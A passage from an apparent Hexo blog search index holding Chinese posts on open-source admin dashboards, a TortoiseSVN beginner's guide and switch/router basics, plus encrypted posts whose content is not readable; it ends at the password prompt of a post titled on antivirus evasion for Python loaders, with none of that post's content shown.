a3598babba5d158fcbf829ddb5c8ea1401be967ef5d640e526df860c258b92cc0937a1a0cce411bdd51f34cdea6a4dc6fe79823fca6720bb8ebd804af3d00ed35be1f3f705c82bab616788e80ba7c5404cbd65dbe4880a2ab6b4514fcfb47120fe9f6be2c2992bb3080f78f97a9ce79c00ce4d5425fd7d042a34f4355dc068244806ee77e51915afcba367cfd104716aea282e548d62970dcd238037399aadee4529d386e126082d3a7bf827ff6708b106c87a0f787d965d52084870e1f6f6fd7f25af68797c184b1c187e352919670723d04805229b712d0782575381cdedde299ff1836d6779f6946a818757ae52962d29135bdb0d46100899d33ed67dee18f9b43d114a621f223904076952d531e425316cd869ec9915f63bdb1227c4a8215d48a9c8f071636a6b123e0e8f1593b165821ee6c3774a6364304caf9e6eb40502cc5a29204c8d804aceecbcbddf815b6c920d6597a423f3bb028d4987340c681b4d7db7689b7b2b177da21d64a95a46041fca12c7202284b6916a836da4606964ef52f467f3fdd9160abf8c0079978b928d31ef132b0e9</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>ELK日志分析平台</title>
    <url>/2020/10/15/ELK%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>开源后台控制面板</title>
    <url>/2020/10/15/%E5%BC%80%E6%BA%90%E5%90%8E%E5%8F%B0%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="开源后台控制面板"><a href="#开源后台控制面板" class="headerlink" title="开源后台控制面板"></a>开源后台控制面板</h1><p>Web 开发中几乎的平台都需要一个后台管理，这里简单介绍十个开源免费的后台控制面板。</p>
<h2 id="1、AdminLTEithub"><a href="#1、AdminLTEithub" class="headerlink" title="1、AdminLTEithub"></a>1、AdminLTEithub</h2><p>Github Star 数 24969</p>
<p>Github 地址：<a href="https://github.com/almasaeed2010/AdminLTE。" target="_blank" rel="noopener">https://github.com/almasaeed2010/AdminLTE。</a></p>
<p>基于非常流行的 Bootstrap 3.x 的免费的后台 UI 框架。</p>
<p><img src="/2020/10/15/%E5%BC%80%E6%BA%90%E5%90%8E%E5%8F%B0%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/image-20201015215320745.png" alt="image-20201015215320745"></p>
<h2 id="2、vue-Element-Admin"><a href="#2、vue-Element-Admin" class="headerlink" title="2、vue-Element-Admin"></a>2、vue-Element-Admin</h2><p>Github Star 数 19546</p>
<p>Github 地址：<a href="https://github.com/PanJiaChen/vue-element-admin。" target="_blank" rel="noopener">https://github.com/PanJiaChen/vue-element-admin。</a></p>
<p>一个基于 vue2.0  和 Eelement 的控制面板 UI 框架。</p>
<p><img src="/2020/10/15/%E5%BC%80%E6%BA%90%E5%90%8E%E5%8F%B0%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/image-20201015215537624.png" alt="image-20201015215537624"></p>
<h2 id="3、tabler"><a href="#3、tabler" class="headerlink" title="3、tabler"></a>3、tabler</h2><p>Github Star 数 15870</p>
<p>Github 地址：<a href="https://github.com/tabler/tabler。" target="_blank" rel="noopener">https://github.com/tabler/tabler。</a></p>
<p>构建在 BootStrap 4 之上的免费的 HTML 控制面板框架。</p>
<p><img src="/2020/10/15/%E5%BC%80%E6%BA%90%E5%90%8E%E5%8F%B0%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/image-20201015215832562.png" alt="image-20201015215832562"></p>
<h2 id="4、Gentelella"><a href="#4、Gentelella" class="headerlink" title="4、Gentelella"></a>4、Gentelella</h2><p>Github Star 数 15654</p>
<p>一个基于 Bootstarp 的免费的后台控制面板。</p>
<p><img src="/2020/10/15/%E5%BC%80%E6%BA%90%E5%90%8E%E5%8F%B0%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/image-20201015220011715.png" alt="image-20201015220011715"></p>
<h2 id="5、ng2-admin"><a href="#5、ng2-admin" class="headerlink" title="5、ng2-admin"></a>5、ng2-admin</h2><p>Github Star 数 13181</p>
<p>Github 地址：<a href="https://github.com/akveo/ngx-admin。" target="_blank" rel="noopener">https://github.com/akveo/ngx-admin。</a></p>
<p>基于 Angular 2, Bootstrap 4 和 Webpack 的后台管理面板框架。</p>
<p><img src="/2020/10/15/%E5%BC%80%E6%BA%90%E5%90%8E%E5%8F%B0%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/image-20201015220530947.png" alt="image-20201015220530947"></p>
<h2 id="6、ant-design-pro"><a href="#6、ant-design-pro" class="headerlink" title="6、ant-design-pro"></a>6、ant-design-pro</h2><p>Github Star 数 12707</p>
<p>Github 地址：<a href="https://github.com/ant-design/ant-design-pro。" target="_blank" rel="noopener">https://github.com/ant-design/ant-design-pro。</a></p>
<p>开箱即用的中台前端/设计解决方案。</p>
<p><img src="/2020/10/15/%E5%BC%80%E6%BA%90%E5%90%8E%E5%8F%B0%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/image-20201015220906981.png" alt="image-20201015220906981"></p>
<h2 id="7、blur-admin"><a href="#7、blur-admin" class="headerlink" title="7、blur-admin"></a>7、blur-admin</h2><p>Github Star 数 9241</p>
<p>Github 地址：<a href="https://github.com/akveo/blur-admin。" target="_blank" rel="noopener">https://github.com/akveo/blur-admin。</a></p>
<p>基于 Angular 和 Bootstrap 的后台管理面板框架。</p>
<p><img src="/2020/10/15/%E5%BC%80%E6%BA%90%E5%90%8E%E5%8F%B0%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/image-20201015221304824.png" alt="image-20201015221304824"></p>
<h2 id="8、vue-admin"><a href="#8、vue-admin" class="headerlink" title="8、vue-admin"></a>8、vue-admin</h2><p>Github Star 数 8676</p>
<p>Github 地址：<a href="https://github.com/vue-bulma/vue-admin。" target="_blank" rel="noopener">https://github.com/vue-bulma/vue-admin。</a></p>
<p>基于 Vue 和 Bulma 的控制面板。</p>
<h2 id="9、iview-admin"><a href="#9、iview-admin" class="headerlink" title="9、iview-admin"></a>9、iview-admin</h2><p>Github Star 数 8668</p>
<p>Github 地址：<a href="https://github.com/iview/iview-admin。" target="_blank" rel="noopener">https://github.com/iview/iview-admin。</a></p>
<p>基于 iView 的 Vue 2.0 控制面板。</p>
<p><img src="/2020/10/15/%E5%BC%80%E6%BA%90%E5%90%8E%E5%8F%B0%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/image-20201015221629837.png" alt="image-20201015221629837"></p>
<h2 id="10、material-dashboard"><a href="#10、material-dashboard" class="headerlink" title="10、material-dashboard"></a>10、material-dashboard</h2><p>Github Star 数 7111</p>
<p>Github 地址：<a href="https://github.com/creativetimofficial/material-dashboard。" target="_blank" rel="noopener">https://github.com/creativetimofficial/material-dashboard。</a></p>
<p>基于 Bootstrap 4 和 Material 风格的控制面板。</p>
<p><img src="/2020/10/15/%E5%BC%80%E6%BA%90%E5%90%8E%E5%8F%B0%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/image-20201015221910500.png" alt="image-20201015221910500"></p>
]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title>TortoiseSVN小白使用指南</title>
    <url>/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h2 id="安装说明"><a href="#安装说明" class="headerlink" title="安装说明"></a>安装说明</h2><p>首先安装SVN客户端，windows一般选择乌龟客户端<a href="https://tortoisesvn.net/downloads.html。" target="_blank" rel="noopener">https://tortoisesvn.net/downloads.html。</a><br>根据系统位数选择相应客户端进行安装。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201027233522760.png" alt="image-20201027233522760"></p>
<p>如果喜欢用命令行操作，务必记得勾选command line client tool为will be install on local hard driver,不用命令行的跳过这一步。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201027233622157.png" alt="image-20201027233622157"></p>
<p>然后一路next即可安装。安装完毕后，在任意地方右键查看快捷菜单。发现TortoiseSVN即表示安装成功。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201027234000933.png" alt="image-20201027234000933"></p>
<p>如果勾选了安装命令行工具，那么输入命令SVN，有如下提示也表示安装成功</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201027234054612.png" alt="image-20201027234054612"></p>
<p>此时菜单全是英文的，如果不习惯英文，可以去下载语言包，记得下对系统位数。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201027234136373.png" alt="image-20201027234136373"></p>
<p>安装完语言包之后，可以右键进入setting设置。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201027234212094.png" alt="image-20201027234212094"></p>
<p>然后确定。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201027234334219.png" alt="image-20201027234334219"></p>
<h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><h4 id="检出项目"><a href="#检出项目" class="headerlink" title="检出项目"></a>检出项目</h4><p>假如项目已经在服务器的仓库里，那么现在你要做的就是把它检出到本地。<br>首先创建一个空文件夹。在空文件夹内右键，选择SVN检出。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201027234438932.png" alt="image-20201027234438932"></p>
<p>填入版本库地址，选择确定。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201027234532978.png" alt="image-20201027234532978"></p>
<p>此时会弹出一个对话框让输入账号密码，输入账号密码即可。记得勾选保存认证，不然每次操作都会让输入。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201027234641844.png" alt="image-20201027234641844"></p>
<p>等几分钟就可以检出完毕。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201027234716694.png" alt="image-20201027234716694"></p>
<p>此时在你的目录下就能看到你的项目，现在可以开始愉快的工作了。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201027234756144.png" alt="image-20201027234756144"></p>
<h4 id="导入项目"><a href="#导入项目" class="headerlink" title="导入项目"></a>导入项目</h4><p>但是有时候已经在本地建立好了项目，需要把项目推到SVN上，此时应怎么做呢？<br>右键选择版本库浏览器。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201027235237050.png" alt="image-20201027235237050"></p>
<p>在相应目录下，右键，加入文件/加入文件夹，选择相应目录即可。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201027235323569.png" alt="image-20201027235323569"></p>
<p>比如现在有个项目叫SVNProject，想把它传到SVN上，需选择加入文件夹即可。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201027235441357.png" alt="image-20201027235441357"></p>
<p>务必要输入提交信息。这样别人才能知道你干了什么。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201027235525597.png" alt="image-20201027235525597"></p>
<p>导入成功就能看到目录。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201027235649939.png" alt="image-20201027235649939"></p>
<p>但是，不要以为导入成功就可以了。你还得重新检出，重新检出的项目才是受SVN控制的，务必记得检出。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201027235756038.png" alt="image-20201027235756038"></p>
<p>在SVNProject上右键检出到本地，然后在里面进行修改。现在就可以愉快的工作了。<br>检出过后的右键菜单变成了这样。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201027235909460.png" alt="image-20201027235909460"></p>
<h4 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h4><p>绿色表示当前文件没有被修改过（看不见颜色的重启下电脑就好了）。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201027235953440.png" alt="image-20201027235953440"></p>
<p>假如在新项目.txt中加了一行字，然后保存。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028000045437.png" alt="image-20201028000045437"></p>
<p>发现现在变成了红色，红色表示已修改。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028000118270.png" alt="image-20201028000118270"></p>
<p>怎么提交修改？<br>在根目录下，右键选择提交。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028000200811.png" alt="image-20201028000200811"></p>
<p>务必记得输入提交信息（虽然不输入也能提交），提交信息可以方便日后查看。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028000238854.png" alt="image-20201028000238854"></p>
<p>提交完毕后，可以发现又恢复到了绿色。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028000318480.png" alt="image-20201028000318480"></p>
<h4 id="未知文件提交"><a href="#未知文件提交" class="headerlink" title="未知文件提交"></a>未知文件提交</h4><p>假如现在加入了一个新文件。可以看出是蓝色的。蓝色表示不属于版本库的未知文件，未知文件是不能提交的。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028000504690.png" alt="image-20201028000504690"></p>
<p>记住选择增加把它加入到版本库里面去。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028000550414.png" alt="image-20201028000550414"></p>
<p>增加完毕后，变成了蓝色加号，表示新增加的版本库文件。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028000627874.png" alt="image-20201028000627874"></p>
<p>接下来，只需写代码，然后提交即可。<br>删除文件也应该右键提交，如下。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028000719609.png" alt="image-20201028000719609"></p>
<p>记得随时检查你的文件状态，如果没有添加到版本控制里要及时添加进去，不然你的文件提交不上去。</p>
<h4 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h4><p>假如你和B同学在协作。B同学写完代码提交到了SVN上，如果你想获取最新修改，就需要选择更新（如果服务器上已经有别人提交过的新的，你是提交不上去的，必须先更新再提交）。<br>怎么知道服务器有没有更新？你可以直接选择更新，有没有更新一下就知道。或者右键检查修改，然后检查版本库，就能看到服务器上改了哪些文件。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028000829629.png" alt="image-20201028000829629"></p>
<p>右键选择HEAD和BASE比较。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028000902665.png" alt="image-20201028000902665"></p>
<p>左边的表示你的代码，右边的表示服务器上的代码。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028000946986.png" alt="image-20201028000946986"></p>
<p>如果有修改记得及时更新到本地然后再继续工作。</p>
<p>但是有时候更新会冲突，比如你和服务器上的改了同一个地方。<br>这时候你需要更新下来解决冲突。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028001109984.png" alt="image-20201028001109984"></p>
<p>&lt;&lt;&lt;&lt;&lt;&lt;.mine到====表示你的代码，其他表示服务器的代码。你只需改成你想要的。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028001211204.png" alt="image-20201028001211204"></p>
<p>然后选择解决，告诉SVN我已经解决冲突了就行了。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028001242358.png" alt="image-20201028001242358"></p>
<p>剩下的就是团队协作间的更新提交操作。</p>
<h4 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h4><p>选择显示日志，可以看出团队里面的人干了什么。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028001355329.png" alt="image-20201028001355329"></p>
<p>可以看出谁谁谁，什么时间，干了什么事。最后那一列信息是自己提交的时候写的。建议大家提交时务必要填写提交信息，这样别人一看就知道你干了什么。提交信息对于自己也是有好处的，时间长了也能看到当初做了什么。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028001434269.png" alt="image-20201028001434269"></p>
<h4 id="版本回滚"><a href="#版本回滚" class="headerlink" title="版本回滚"></a>版本回滚</h4><p>如果你改了东西，但是还没有提交，可以使用还原功能。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028001521341.png" alt="image-20201028001521341"></p>
<p>但是如果我们写错了东西并且提交了上去怎么办？通过版本回滚可以将文件恢复到<br>以前的版本。右键更新至版本，通过查看日志来选择版本，然后回滚即可。 </p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028001602810.png" alt="image-20201028001602810"></p>
<p>有时候我们需要查看以前版本的代码。此时我们可以新建个文件夹检出到指定版本。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028001639714.png" alt="image-20201028001639714"></p>
<h4 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h4><p>版本控制有好几种方法，如下：</p>
<p>1、在提交发布版本时添加版本信息，这是最简单的一种方法。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028001739419.png" alt="image-20201028001739419"></p>
<p>2、打标签。</p>
<p>每次发布版本时应该打标签。右键选择分支/标记。在至路径以版本号打上标签即可 。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028001826674.png" alt="image-20201028001826674"></p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028001852756.png" alt="image-20201028001852756"></p>
<p>这样你就有了一个v1.0版本的标签。<br>以后如果你想查看某个版本的代码，只需切换过去就行。</p>
<p><img src="/2020/10/27/TortoiseSVN%E5%B0%8F%E7%99%BD%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20201028001932431.png" alt="image-20201028001932431"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>我们在日常使用中，最常用的是更新和提交操作。这两个步骤务必要非常熟练。其他的可以在遇到问题是查看文档。此外，<strong>需要注意的是，所有版本控制工具只能跟踪文本文件（能用记事本打开查看的文件）</strong>，不要妄想SVN能记录你word改了哪一行。一旦遇到word冲突，记住仔细对比两个版本，然后解决冲突。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>hxxps://blog.csdn.net/maplejaw_/article/details/52874348</p>
]]></content>
      <categories>
        <category>横贯八方</category>
      </categories>
      <tags>
        <tag>横贯八方</tag>
      </tags>
  </entry>
  <entry>
    <title>路由交换原理</title>
    <url>/2020/10/28/%E8%B7%AF%E7%94%B1%E4%BA%A4%E6%8D%A2%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h2 id="交换机工作原理"><a href="#交换机工作原理" class="headerlink" title="交换机工作原理"></a>交换机工作原理</h2><h4 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h4><p>当交换机收到数据时，它会检查它的目的MAC地址，然后把数据从目的主机所在的接口转发出去。</p>
<p>交换机之所以能实现这一功能，是因为交换机内部有一个MAC地址表，MAC地址表记录了网络中所有MAC地址与该交换机各端口的对应信息。某一数据帧需要转发时，交换机根据该数据帧的目的MAC地址来查找MAC地址表，从而得到该地址对应的端口，即知道具有该MAC地址的设备是连接在交换机的哪个端口上，然后交换机把数据帧从该端口转发出去。</p>
<h4 id="原理核心"><a href="#原理核心" class="headerlink" title="原理核心"></a>原理核心</h4><p>1、交换机根据收到数据帧中的源MAC地址建立该地址同交换机端口的映射，并将其写入MAC地址表中。</p>
<p>2、交换机将数据帧中的目的MAC地址同已建立的MAC地址表进行比较，以决定由哪个端口进行转发。</p>
<p>3、如数据帧中的目的MAC地址不在MAC地址表中，则向所有端口转发。这一过程称为泛洪（flood）。</p>
<p>4、广播帧和组播帧向所有的端口转发。</p>
<p>某网络拓扑图如下：</p>
<p><img src="/2020/10/28/%E8%B7%AF%E7%94%B1%E4%BA%A4%E6%8D%A2%E5%8E%9F%E7%90%86/image-20201028230117143.png" alt="image-20201028230117143"></p>
<h4 id="MAC地址表构建"><a href="#MAC地址表构建" class="headerlink" title="MAC地址表构建"></a>MAC地址表构建</h4><p>为快速转发报文，以太网交换机需要建立和维护MAC地址表。交换机采用源MAC地址学习的方法建立MAC地址表。</p>
<p>交换机的初始状态MAC地址表为空。</p>
<p>当计算机PC1要发送数据帧给计算机PC6时，因此时地址表是空的，交换机将向除PC1连接端口E0/1以外的其他所有端口转发数据帧。在转发之前，首先检查该数据帧的源MAC地址（00-10-B5-4B-30-85），并在交换机的MAC地址表中添加一条记录（00-10-B5-4B-30-85，E0/1）使之和端口E0/1相对应。</p>
<p>计算机PC6收到发送的数据帧后，用该数据帧的目的MAC地址和本机的MAC地址比较，发现PC1找的正是它，则接收该数据帧，其他计算机丢弃数据帧。</p>
<p>计算机PC6回复PC1时，交换机直接从端口E0/1转发，并学习到（00-10-B5-4B-30-65）为PC6连接的端口，将其添加到地址表中。</p>
<p> 交换机的其他端口利用源MAC地址学习的方法在MAC地址表中不断添加新的MAC地址与端口号的对应信息。直到MAC地址表添加完整为止。</p>
<h4 id="工作特性"><a href="#工作特性" class="headerlink" title="工作特性"></a>工作特性</h4><p>1、交换机的每一个端口所连接的网段都是一个独立的冲突域。 </p>
<p>2、交换机所连接的设备仍然在同一个广播域内，也就是说，交换机不隔绝广播（惟一的例外是在配有VLAN的环境中）。 </p>
<p>3、交换机依据帧头的信息进行转发，因此说交换机是工作在数据链路层的网络设备（此处所述交换机仅指传统的二层交换设备）。</p>
<h2 id="路由器工作原理"><a href="#路由器工作原理" class="headerlink" title="路由器工作原理"></a>路由器工作原理</h2><h4 id="工作方式-1"><a href="#工作方式-1" class="headerlink" title="工作方式"></a>工作方式</h4><p>路由器是构建整个网络最核心的设备。比较著名的品牌为cisco、锐捷、华为、TP-LINK、H3C等等。路由器接口是用来接收数据包的。</p>
<p>那么数据包到达路由器接口会发生什么呢？首先路由器会检查数据帧目标地址字段中的数据链路标识。（其实就是MAC地址，二层，数据链路层，只在单跳中有用，在网络上每进行一跳数据包头中的目的MAC都要进行改写才能继续进行下一跳。这和IP地址不一样，数据包中的目的IP地址在整个网络传输过程中是一直不会变化的。IP地址类似我们的地址，MAC地址类似于我们每个人的身份证号），如果它包含了路由器接口标识符或者广播标识符，那么说明这个数据包是给路由器我自己的，则路由器需要将从帧中剥离出数据包并传递给网络层。</p>
<h4 id="原理核心-1"><a href="#原理核心-1" class="headerlink" title="原理核心"></a>原理核心</h4><p>路由器依据目的IP地址的网络地址部分，通过路由选择算法确定一条从源结点到达目的结点的最佳路由。</p>
<p>路由器通过路由协议，网络连接的情况及网络的性能来建立网络的拓扑结构。路由算法为网络上的路由产生一个权值，路由器通过权值来选择最佳路径，权值越小，路由最佳。 </p>
<p>对于一台路由器，其分组转发的任务即是在收到数据包后，根据路由表所提供的最佳路径的信息，将其转发给下一条的路由器，目的端口或是缺省路由器。缺省路由器也称缺省开关，它是与主机在同一个子网中的路由端口的IP地址。</p>
<p>路由器也有它的缺省开关。如果目标网络中没有直接显示在路由表里的时候，那么就将数据分组传送给缺省网关。它一般指向与该路由器的一个端口的直接相连接的，并且通往Interest的出口路由。 </p>
<p>分组转发的思想：</p>
<p>目的IP地址，全程不变。 </p>
<p>目的MAC地址，逐跳修改。 </p>
<h4 id="路由表"><a href="#路由表" class="headerlink" title="路由表"></a>路由表</h4><p>路由表通过对路由表的查询来选择最佳路径的策略，路由表中保存着各种传输路径的相关数据，供路由选择时使用。 </p>
<p>路由表的内容主要包括：</p>
<p>1、目的网络地址及其所对应的目的端口 </p>
<p>2、下一跳路由器的名字</p>
<p>3、缺省路由的信息</p>
<h2 id="单网卡双网关"><a href="#单网卡双网关" class="headerlink" title="单网卡双网关"></a>单网卡双网关</h2><p>Windows系统单网卡配置双IP双网关。</p>
<p>Windows系统单网卡配置双IP双网关，一般情况下单网卡配置双IP是没有问题，当问题常常出在配置双网关上，默认windows系统只能有一个网关。这样对于需要配置双IP双网关的环境就有些问题。</p>
<h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><p>在公司内网中有研发和测试两个网段，两个网段的环境都需要进行联通，才能进行访问，这时就可以在PC上设置双IP双网卡来访问两个不同的网段。</p>
<h4 id="设置方法"><a href="#设置方法" class="headerlink" title="设置方法"></a>设置方法</h4><p>1、打开网络连接</p>
<p><img src="/2020/10/28/%E8%B7%AF%E7%94%B1%E4%BA%A4%E6%8D%A2%E5%8E%9F%E7%90%86/image-20201028232747512.png" alt="image-20201028232747512"></p>
<p>2、右键属性</p>
<p><img src="/2020/10/28/%E8%B7%AF%E7%94%B1%E4%BA%A4%E6%8D%A2%E5%8E%9F%E7%90%86/image-20201028233334342.png" alt="image-20201028233334342"></p>
<p><img src="/2020/10/28/%E8%B7%AF%E7%94%B1%E4%BA%A4%E6%8D%A2%E5%8E%9F%E7%90%86/image-20201028233528865.png" alt="image-20201028233528865"></p>
<p><img src="/2020/10/28/%E8%B7%AF%E7%94%B1%E4%BA%A4%E6%8D%A2%E5%8E%9F%E7%90%86/image-20201028233657752.png" alt="image-20201028233657752"></p>
<p><img src="/2020/10/28/%E8%B7%AF%E7%94%B1%E4%BA%A4%E6%8D%A2%E5%8E%9F%E7%90%86/image-20201028233742259.png" alt="image-20201028233742259"></p>
<p>这样设置，主要是解决双网络的情况。</p>
]]></content>
      <categories>
        <category>横贯八方</category>
      </categories>
      <tags>
        <tag>横贯八方</tag>
      </tags>
  </entry>
  <entry>
    <title>python对加载器免杀</title>
    <url>/2020/11/01/python%E5%AF%B9%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%85%8D%E6%9D%80/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
